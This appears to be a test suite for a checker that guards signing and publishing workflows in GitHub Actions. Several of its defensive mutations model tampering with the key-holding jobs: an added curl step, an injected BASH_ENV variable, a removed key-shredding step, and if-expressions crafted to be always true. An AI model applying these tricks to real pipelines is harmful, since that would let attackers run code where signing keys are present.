  test('C-WF6 refuses cancel-in-progress true', () => refuses('C-WF6', [{ file: 'publish.yml', from: '  cancel-in-progress: false\n', to: '  cancel-in-progress: true\n' }], /publish\.yml: concurrency/));
  test('C-WF6 refuses a missing queue', () => refuses('C-WF6', [{ file: 'resign.yml', from: '  queue: max\n', to: '' }], /resign\.yml: concurrency/));
  test('C-WF6 refuses another group', () => refuses('C-WF6', [{ file: 'resign.yml', from: '  group: index-sign\n', to: '  group: resign\n' }], /resign\.yml: concurrency/));
  test('C-WF6 refuses a job-level concurrency', () => refuses('C-WF6', [{ file: 'publish.yml', job: 'verify', from: '    timeout-minutes: 120\n', to: '    timeout-minutes: 120\n    concurrency: verify\n' }], /job verify: concurrency/));
  test('C-WF6 refuses the index-sign group in check.yml', () => refuses('C-WF6', [{ file: 'check.yml', from: '\npermissions:\n', to: '\nconcurrency:\n  group: index-sign\npermissions:\n' }], /check\.yml/));
});

describe('C-WF7 the two sign jobs', () => {
  test('C-WF7 the real workflows pass', () => assert.deepEqual(RULES['C-WF7'](real), []));
  test('C-WF7 refuses one changed character in the steps', () => refuses('C-WF7', [{ file: 'resign.yml', from: 'signature from the eve-cyno/plugins signing workflow', to: 'signature from the eve-cyno/plugins signing workflow.' }], /steps differ/));
  test('C-WF7 refuses another env key', () => refuses('C-WF7', [{ file: 'resign.yml', job: 'sign', from: '      HEAD_COMMENT:', to: '      HEAD_TRUSTED:' }], /env/));
  test('C-WF7 refuses an env value from another job', () => refuses('C-WF7', [{ file: 'publish.yml', job: 'sign', from: '${{ needs.build.outputs.head_sha256 }}', to: '${{ needs.upload.outputs.head_sha256 }}' }], /env/));
  test('C-WF7 refuses another difference outside steps and env', () => refuses('C-WF7', [{ file: 'resign.yml', job: 'sign', from: '    timeout-minutes: 15\n', to: '    timeout-minutes: 16\n' }], /timeout-minutes/));
  test('C-WF7 refuses a job name (approved-base.mjs finds the job by its id)', () => refuses('C-WF7', [{ file: 'publish.yml', job: 'sign', from: '    runs-on: ubuntu-24.04\n', to: '    name: Sign\n    runs-on: ubuntu-24.04\n' }], /key name/));
  test('C-WF7 refuses an if on the resign sign job', () => refuses('C-WF7', [{ file: 'resign.yml', job: 'sign', from: '    needs: head\n', to: '    needs: head\n    if: always()\n' }], /resign\.yml job sign: if/));
  const both = (from, to) => [{ file: 'publish.yml', job: 'sign', from, to }, { file: 'resign.yml', job: 'sign', from, to }];
  test('C-WF7 refuses a full checkout in both', () => refuses('C-WF7', both('          sparse-checkout: vendor/eve-cyno-host/host/src/keys\n          sparse-checkout-cone-mode: false\n', ''), /checkout/));
  test('C-WF7 refuses npm in both', () => refuses('C-WF7', both('          sudo apt-get update -qq\n', '          sudo apt-get update -qq\n          npm ci\n'), /npm/));
  test('C-WF7 refuses setup-node in both', () => refuses('C-WF7', both('      - name: Install minisign (Ubuntu\'s package)\n', '      - name: Node\n        uses: actions/setup-node@0123456789012345678901234567890123456789\n      - name: Install minisign (Ubuntu\'s package)\n'), /actions\/setup-node/));
  test('C-WF7 refuses a head artifact kept 30 days', () => refuses('C-WF7', [{ file: 'publish.yml', job: 'build', from: '          name: head\n          path: ${{ runner.temp }}/work/index/index.json\n          if-no-files-found: error\n          retention-days: 90\n', to: '          name: head\n          path: ${{ runner.temp }}/work/index/index.json\n          if-no-files-found: error\n          retention-days: 30\n' }], /artifact head.*retention-days 90/));
  test('C-WF7 refuses a catalog artifact without retention', () => refuses('C-WF7', [{ file: 'resign.yml', job: 'head', from: '          name: catalog\n          path: ${{ runner.temp }}/work/index/catalog/\n          if-no-files-found: error\n          retention-days: 90\n', to: '          name: catalog\n          path: ${{ runner.temp }}/work/index/catalog/\n          if-no-files-found: error\n' }], /artifact catalog/));
  test('C-WF7 refuses an artifact it does not know', () => refuses('C-WF7', [{ file: 'publish.yml', job: 'build', from: '          name: archives.json\n', to: '          name: archives\n' }], /artifact archives /));
  const pinned = (f) => new RegExp(`^${f.replace('.', '\\.')} job sign(?: step \\d+)?: .*pinned`);
  test('C-WF7 refuses an added curl step in both sign jobs', () => refuses('C-WF7', both(MINISIGN_STEP, CURL_STEP + MINISIGN_STEP), [pinned('publish.yml'), pinned('resign.yml'), /^publish\.yml job sign step 6: "Report"/, /^resign\.yml job sign step 6: "Report"/]));
  test('C-WF7 refuses an env added to a pinned step in both sign jobs', () => refuses('C-WF7', both(`${MINISIGN_STEP}        run: |\n`, `${MINISIGN_STEP}        env:\n          BASH_ENV: /tmp/x\n        run: |\n`), [/^publish\.yml job sign step 6: "Install minisign \(Ubuntu's package\)" sha256 [0-9a-f]{64}, pinned/, /^resign\.yml job sign step 6: "Install minisign/]));
  test('C-WF7 refuses a removed step in both sign jobs', () => refuses('C-WF7', both('      - name: Shred the secret key file\n        if: always()\n        run: |\n          if [ -e "$RUNNER_TEMP/sign/key" ]; then shred -u "$RUNNER_TEMP/sign/key"; fi\n          [ ! -e "$RUNNER_TEMP/sign/key" ]\n\n', ''), [/^publish\.yml job sign: 10 steps, the pinned list has 11/, /^resign\.yml job sign: 10 steps/]));
});

describe('C-WF8 target test never reaches index', () => {
  test('C-WF8 the real workflows pass', () => assert.deepEqual(RULES['C-WF8'](real), []));
  test('C-WF8 refuses a sign job without its target', () => refuses('C-WF8', [{ file: 'publish.yml', job: 'sign', from: "    if: ${{ inputs.target == 'production' }}\n", to: '' }], /job sign: if/));
  test('C-WF8 refuses sign-test in index', () => refuses('C-WF8', [{ file: 'publish.yml', job: 'sign-test', from: '    timeout-minutes: 15\n', to: '    timeout-minutes: 15\n    environment: index\n' }], /sign-test/));
  test('C-WF8 refuses an upload without sign-test in needs', () => refuses('C-WF8', [{ file: 'publish.yml', from: '    needs: [build, sign, sign-test]\n', to: '    needs: [build, sign]\n' }], /job upload: needs/));
  test('C-WF8 refuses another upload if', () => refuses('C-WF8', [{ file: 'publish.yml', from: "${{ !cancelled() && needs.build.result == 'success' &&", to: "${{ always() && needs.build.result == 'success' &&" }], /job upload: if/));
  test('C-WF8 refuses a third target', () => refuses('C-WF8', [{ file: 'publish.yml', from: '          - production\n', to: '          - production\n          - staging\n' }], /target/));
  test('C-WF8 refuses another job', () => refuses('C-WF8', [{ file: 'publish.yml', from: '\n  verify:\n', to: '\n  extra:\n    runs-on: ubuntu-24.04\n    steps: []\n  verify:\n' }], /jobs/));
});

describe('C-WF9 one commit per run, no re-runs', () => {
  test('C-WF9 the real workflows pass', () => assert.deepEqual(RULES['C-WF9'](real), []));
  test('C-WF9 refuses a sha input', () => refuses('C-WF9', [{ file: 'publish.yml', from: '      repair:\n', to: '      sha:\n        type: string\n      repair:\n' }], /input sha/));
  test('C-WF9 refuses a checkout of a branch', () => refuses('C-WF9', [{ file: 'resign.yml', job: 'upload', from: '          ref: ${{ github.sha }}\n', to: '          ref: main\n' }], /resign\.yml job upload step \d+: checkout/));
  test('C-WF9 refuses a checkout without ref', () => refuses('C-WF9', [{ file: 'publish.yml', job: 'verify', from: '          ref: ${{ github.sha }}\n', to: '' }], /publish\.yml job verify step \d+: checkout/));
  test('C-WF9 refuses a job without the run-attempt guard', () => refuses('C-WF9', [{ file: 'publish.yml', job: 'verify', from: GUARD_TEXT, to: '' }], /job verify: the first step/));
  test('C-WF9 refuses a changed guard', () => refuses('C-WF9', [{ file: 'resign.yml', job: 'sign', from: '[ "${GITHUB_RUN_ATTEMPT:-}" = 1 ]', to: '[ "${GITHUB_RUN_ATTEMPT:-}" -ge 1 ]' }, { file: 'publish.yml', job: 'sign', from: '[ "${GITHUB_RUN_ATTEMPT:-}" = 1 ]', to: '[ "${GITHUB_RUN_ATTEMPT:-}" -ge 1 ]' }], /job sign: the first step/));
  test('C-WF9 refuses a build job without the head-of-main check', () => refuses('C-WF9', [{ file: 'publish.yml', job: 'build', from: MAIN_HEAD_TEXT, to: '' }], /job build: the second step/));
  test('C-WF9 refuses continue-on-error', () => refuses('C-WF9', [{ file: 'resign.yml', job: 'verify', from: '    timeout-minutes: 120\n', to: '    timeout-minutes: 120\n    continue-on-error: true\n' }], /continue-on-error/));
});

describe('C-WF10 resign.yml upload', () => {
  test('C-WF10 the real workflows pass', () => assert.deepEqual(RULES['C-WF10'](real), []));
  test('C-WF10 refuses another needs', () => refuses('C-WF10', [{ file: 'resign.yml', from: '    needs: [head, sign]\n', to: '    needs: [sign]\n' }], /job upload: needs/));
  test('C-WF10 refuses an if override', () => refuses('C-WF10', [{ file: 'resign.yml', from: '    needs: [head, sign]\n', to: '    needs: [head, sign]\n    if: ${{ !cancelled() }}\n' }], /job upload: if/));
  test('C-WF10 refuses a head job that always runs', () => refuses('C-WF10', [{ file: 'resign.yml', from: "    if: ${{ needs.check.outputs.needed == 'true' }}\n", to: '' }], /job head: if/));
  test('C-WF10 refuses inputs on resign.yml', () => refuses('C-WF10', [{ file: 'resign.yml', from: '\n  workflow_dispatch:\n', to: '\n  workflow_dispatch:\n    inputs:\n      lift:\n        type: string\n' }], /inputs/));
});

describe('C-WF11 no reviewer is written in the repository; it is read from the environments', () => {
  const ab = (line) => ({ path: 'tools/approved-base.mjs', from: '// tools/approved-base.mjs:', to: `${line}\n// tools/approved-base.mjs:` });
  test('C-WF11 the real files pass', () => assert.deepEqual(RULES['C-WF11'](real), []));
  test('C-WF11 refuses a reviewer variable in a workflow', () => refuses('C-WF11', [{ file: 'publish.yml', job: 'upload', from: '      TARGET: ${{ inputs.target }}\n', to: '      TARGET: ${{ inputs.target }}\n      APPROVER: ${{ vars.REVIEWER_ID }}\n' }], /publish\.yml: names a reviewer outside a comment/));
  test('C-WF11 reads a # after a Unicode space as text, as YAML does (no comment hides a reviewer)', () => refuses('C-WF11', [{ file: 'publish.yml', job: 'upload', from: '      TARGET: ${{ inputs.target }}\n', to: '      TARGET: ${{ inputs.target }}\n      APPROVER: x\u00a0# ${{ vars.REVIEWER_ID }}\n' }], /^publish\.yml: names a reviewer outside a comment/));
  test('C-WF11 refuses a reviewer input', () => refuses('C-WF11', [{ file: 'publish.yml', from: '      repair:\n', to: '      reviewer:\n        type: string\n      repair:\n' }], /publish\.yml: names a reviewer outside a comment/));
  test('C-WF11 refuses a user id literal in a workflow', () => refuses('C-WF11', [{ file: 'resign.yml', job: 'check', from: '    timeout-minutes: 30\n', to: '    timeout-minutes: 30\n    env:\n      OWNER_ID: 98765432\n' }], /resign\.yml: a user id or login written as a literal \(line \d+\)/));
  test('C-WF11 refuses an actor compared with a literal in a workflow', () => refuses('C-WF11', [{ file: 'resign.yml', job: 'check', from: '    timeout-minutes: 30\n', to: "    timeout-minutes: 30\n    if: ${{ github.actor_id == '98765432' }}\n" }], /resign\.yml: a user id or login written as a literal/));
  test('C-WF11 refuses a login compared with a literal in a workflow', () => refuses('C-WF11', [{ file: 'publish.yml', job: 'build', from: '    timeout-minutes: 120\n', to: "    timeout-minutes: 120\n    if: ${{ github.triggering_actor == 'someone' }}\n" }], /publish\.yml: a user id or login written as a literal/));
  test('C-WF11 refuses a mixed-case actor compared with a literal in a workflow (GitHub reads names in any case)', () => refuses('C-WF11', [{ file: 'publish.yml', job: 'build', from: '    timeout-minutes: 120\n', to: "    timeout-minutes: 120\n    if: ${{ GitHub.Triggering_Actor == 'someone' }}\n" }], /^publish\.yml: a user id or login written as a literal \(line \d+\)$/));
  test('C-WF11 refuses an upper-case id compared with a literal in a workflow', () => refuses('C-WF11', [{ file: 'resign.yml', job: 'check', from: '    timeout-minutes: 30\n', to: '    timeout-minutes: 30\n    if: ${{ github.event.sender.ID == 98765432 }}\n' }], /^resign\.yml: a user id or login written as a literal \(line \d+\)$/));
  test('C-WF11 refuses a user id compared with a literal in a tool', () => refuses('C-WF11', [ab('const mine = (a) => a.user.id === 98765432;')], /tools\/approved-base\.mjs: a user id or login written as a literal/));
  test('C-WF11 refuses a literal compared with a user id in a tool', () => refuses('C-WF11', [ab("const mine = (a) => '98765432' == a.user?.id;")], /tools\/approved-base\.mjs: a user id or login written as a literal/));
  test('C-WF11 refuses a login compared with a literal in a tool', () => refuses('C-WF11', [ab("const mine = (a) => a.user.login === 'someone';")], /tools\/approved-base\.mjs: a user id or login written as a literal/));
  test('C-WF11 refuses a user id constant in a tool', () => refuses('C-WF11', [ab('const APPROVER_ID = 98765432;')], /tools\/approved-base\.mjs: a user id or login written as a literal/));
  test('C-WF11 refuses a committed reviewer file', () => refuses('C-WF11', [{ path: 'tools/reviewer.json', text: '{"id": 98765432}\n' }], /tools\/reviewer\.json: a reviewer file/));
  test('C-WF11 refuses a tool that names a reviewer file or key', () => refuses('C-WF11', [ab("const F = 'tools/reviewer.json';")], /tools\/approved-base\.mjs: names a reviewer file or a reviewer id or login key/));
  test('C-WF11 refuses a reviewer id key in the documents', () => refuses('C-WF11', [{ path: 'docs/notes.md', text: 'Set reviewer_login: someone in the file.\n' }], /docs\/notes\.md: names a reviewer file or a reviewer id or login key/));
  test('C-WF11 refuses a reviewer argument or environment variable in a tool', () => refuses('C-WF11', [{ path: 'tools/check-envs.mjs', from: '// tools/check-envs.mjs:', to: "const A = process.argv.indexOf('--reviewer');\n// tools/check-envs.mjs:" }], /tools\/check-envs\.mjs: a reviewer argument or environment variable/));
  test('C-WF11 refuses lib/reviewer.mjs reading the environment', () => refuses('C-WF11', [{ path: 'tools/lib/reviewer.mjs', from: '// tools/lib/reviewer.mjs:', to: 'const E = process.env.X;\n// tools/lib/reviewer.mjs:' }], /tools\/lib\/reviewer\.mjs: reads process/));
  test('C-WF11 refuses lib/reviewer.mjs reading a file', () => refuses('C-WF11', [{ path: 'tools/lib/reviewer.mjs', from: '// tools/lib/reviewer.mjs:', to: "import fs from 'node:fs';\n// tools/lib/reviewer.mjs:" }], /tools\/lib\/reviewer\.mjs: imports node:fs/));
  test('C-WF11 refuses lib/reviewer.mjs loading code at run time', () => refuses('C-WF11', [{ path: 'tools/lib/reviewer.mjs', from: '// tools/lib/reviewer.mjs:', to: "const m = await import('node:child_process');\n// tools/lib/reviewer.mjs:" }], /tools\/lib\/reviewer\.mjs: loads a module at run time/));
  test('C-WF11 refuses a missing lib/reviewer.mjs', () => refuses('C-WF11', [{ path: 'tools/lib/reviewer.mjs', text: null }], /tools\/lib\/reviewer\.mjs: missing/));
});

describe('C-WF12 a job after a job that can be skipped carries its own if', () => {
  const VERIFY_IF_LINE = "    if: ${{ !cancelled() && needs.upload.result == 'success' }}\n";
  const verify = (from, to) => [{ file: 'publish.yml', job: 'verify', from, to }];
  test('C-WF12 the real workflows pass', () => assert.deepEqual(RULES['C-WF12'](real), []));
  test('C-WF12 refuses verify without if (one of sign and sign-test is skipped in every run)', () => refuses('C-WF12', verify(VERIFY_IF_LINE, ''), [/^publish\.yml job verify: no if, so GitHub skips it whenever sign, sign-test or upload is skipped/, /^publish\.yml job verify: needs must be exactly \[upload\]/]));
  test('C-WF12 refuses verify with if: false', () => refuses('C-WF12', verify(VERIFY_IF_LINE, '    if: false\n'), [/^publish\.yml job verify: if must have !cancelled\(\) as a top-level && term/, /if does not require needs\.upload\.result == 'success'/]));
  test('C-WF12 refuses verify with if: success()', () => refuses('C-WF12', verify(VERIFY_IF_LINE, '    if: success()\n'), [/^publish\.yml job verify: if calls success\(\)/, /^publish\.yml job verify: if must have !cancelled\(\)/]));
  test('C-WF12 refuses verify with an || around !cancelled()', () => refuses('C-WF12', verify(VERIFY_IF_LINE, "    if: ${{ !cancelled() && needs.upload.result == 'success' || inputs.repair }}\n"), /^publish\.yml job verify: if must have !cancelled\(\) as a top-level && term/));
  test('C-WF12 refuses verify without needs (it would read the old live index)', () => refuses('C-WF12', verify('    needs: upload\n', ''), /^publish\.yml job verify: needs must be exactly \[upload\]/));
  test('C-WF12 refuses a needs that names no job', () => refuses('C-WF12', [{ file: 'check.yml', job: 'review', from: '    needs: verify-vendor\n', to: '    needs: [verify-vendor, lint]\n' }], /^check\.yml job review: needs lint, not a job of check\.yml/));
  test('C-WF12 refuses a conditional job before jobs with the default if', () => refuses('C-WF12', [{ file: 'check.yml', job: 'verify-vendor', from: '    timeout-minutes: 15\n', to: '    timeout-minutes: 15\n    if: ${{ github.event.pull_request.draft == false }}\n' }], [/^check\.yml job checks: no if/, /^check\.yml job review: no if/]));
  test('C-WF12 counts the whole needs chain, not only the jobs named (resign.yml check before the head gate)', () => refuses('C-WF12', [{ file: 'resign.yml', job: 'check', from: '    timeout-minutes: 30\n', to: "    timeout-minutes: 30\n    if: ${{ github.event_name == 'schedule' }}\n" }], [/^resign\.yml job sign: no if, so GitHub skips it whenever check is skipped/, /^resign\.yml job verify: no if, so GitHub skips it whenever check is skipped/]));

  // check.yml review after a verify-vendor that can be skipped: review's own if is read term by term.
  const GATE = { file: 'check.yml', job: 'verify-vendor', from: '    timeout-minutes: 15\n', to: '    timeout-minutes: 15\n    if: ${{ github.event.pull_request.draft == false }}\n' };
  const review = (cond) => [GATE, { file: 'check.yml', job: 'review', from: '    needs: verify-vendor\n', to: `    needs: verify-vendor\n    if: ${cond}\n` }];
  test('C-WF12 takes a job\'s own if in the form it asks for', () => {
    const problems = RULES['C-WF12'](mutant(review("${{ !cancelled() && needs.verify-vendor.result == 'success' }}")));
    assert.deepEqual(problems.filter((p) => p.startsWith('check.yml job review:')), []);
  });
  test('C-WF12 refuses a needs result inside an ||', () => refuses('C-WF12', review("${{ !cancelled() && (needs.verify-vendor.result == 'success' || true) }}"), /^check\.yml job review: if does not require needs\.verify-vendor\.result == 'success' as a top-level && term/));
  test('C-WF12 refuses a needs result compared again', () => refuses('C-WF12', review("${{ !cancelled() && needs.verify-vendor.result == 'success' == false }}"), /^check\.yml job review: if does not require needs\.verify-vendor\.result == 'success' as a top-level && term/));
  for (const fn of ['Always', 'SUCCESS', 'Failure']) {
    test(`C-WF12 refuses ${fn}() (GitHub reads function names in any case)`, () => refuses('C-WF12', review(`\${{ !cancelled() && needs.verify-vendor.result == 'success' && ${fn}() }}`), new RegExp(`^check\\.yml job review: if calls ${fn}\\(\\)`)));
  }
  test('C-WF12 refuses an if with text outside its ${{ }} (GitHub reads it as a string, always true)', () => refuses('C-WF12', review("${{ needs.verify-vendor.result == 'success' && !cancelled() && 'x' }} && ${{ 'y' }}"), /^check\.yml job review: if is not one expression/));
  test('C-WF12 reads a pinned if other than upload\'s term by term (resign.yml head after a check that can be skipped)', () => refuses('C-WF12', [{ file: 'resign.yml', job: 'check', from: '    timeout-minutes: 30\n', to: "    timeout-minutes: 30\n    if: ${{ github.event_name == 'schedule' }}\n" }], [/^resign\.yml job head: if must have !cancelled\(\) as a top-level && term/, /^resign\.yml job head: if does not require needs\.check\.result == 'success' as a top-level && term/]));
  test('C-WF12 reads upload\'s if term by term once it is not its pin', () => refuses('C-WF12', [{ file: 'publish.yml', job: 'upload', from: "(inputs.target == 'production' && needs.sign.result == 'success')", to: "(inputs.target == 'production' && needs.sign.result == 'success' || true)" }], /^publish\.yml job upload: if does not require needs\.sign\.result == 'success' as a top-level && term/));
});

describe('C-WF8, C-WF10, C-WF12 a pinned if is compared as written: GitHub never trims it', () => {
  // Text outside the ${{ }} (a trailing space inside quotes, the line break a | block ends with, a second ${{ }}) makes GitHub
  // evaluate format('...{0}...', ...), a non-empty string, so the if is always true: publish.yml sign would run for target test.
  const PINS = [
    ['C-WF8', 'publish.yml', 'sign', "inputs.target == 'production'"],
    ['C-WF8', 'publish.yml', 'sign-test', "inputs.target == 'test'"],
    ['C-WF8', 'publish.yml', 'upload', UPLOAD_IF],
    ['C-WF10', 'resign.yml', 'head', "needs.check.outputs.needed == 'true'"],
    ['C-WF12', 'publish.yml', 'verify', VERIFY_IF],
  ];
  const FORMS = [
    ['a trailing space inside quotes', (e) => `    if: "\${{ ${e} }} "\n`],
    ['a | block', (e) => `    if: |\n      \${{ ${e} }}\n`],
    ['two ${{ }} joined by &&', (e) => `    if: \${{ ${e} }} && \${{ true }}\n`],
    ['a |- block whose last line is spaces beyond its indentation', (e) => `    if: |-\n      \${{ ${e} }}\n          \n`],
  ];
  for (const [rule, file, job, e] of PINS) {
    const from = `    if: \${{ ${e} }}\n`;
    for (const [what, form] of FORMS) {
      test(`${rule} refuses ${file} ${job}'s if with ${what}`, () => refuses(rule, [{ file, job, from, to: form(e) }], new RegExp(`^${file.replace('.', '\\.')} job ${job}: .*\\bif\\b`)));
    }
    test(`${rule} takes ${file} ${job}'s if as a |- block that holds exactly the pin`, () => assert.deepEqual(RULES[rule](mutant([{ file, job, from, to: `    if: |-\n      \${{ ${e} }}\n` }])), []));
  }
});
